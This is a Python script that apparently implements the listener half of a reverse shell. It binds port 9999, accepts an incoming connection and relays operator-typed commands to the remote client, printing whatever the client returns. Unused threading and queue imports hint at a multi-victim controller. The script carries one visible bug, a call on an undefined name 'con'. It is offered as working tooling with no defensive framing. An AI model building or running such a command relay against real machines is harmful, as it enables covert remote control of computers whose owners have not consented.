#!/usr/bin/env python3

import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
connections = []
addresses = []


# Used to connect computers
def create_socket():
	try:
		global host, port, s
		host = ""
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Error creating socket: " + str(msg))


# Bind socket and listen to connections
def bind_socket():
	try:
		global host, port, s
		
		print("Binding port " + str(port))
		s.bind((host, port))
		# Listen until connected or 5 bad connections made
		s.listen(5)

	except socket.error as msg:
		print("Error binding socket: " + str(msg))
		print("Retrying...")
		bind_socket()

# Establish connection with client (socket must be listening)
def socket_accept():
	conn, address = s.accept()
	print("Connection has been established. | IP: " + address[0] + " | Port: " + str(address[1]))
	send_command(conn)
	con.close()

def send_command(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		elif len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			response = str(conn.recv(1024), 'utf-8')
			print(response, end="")

def main():
	create_socket()
	bind_socket()
	socket_accept()

main()
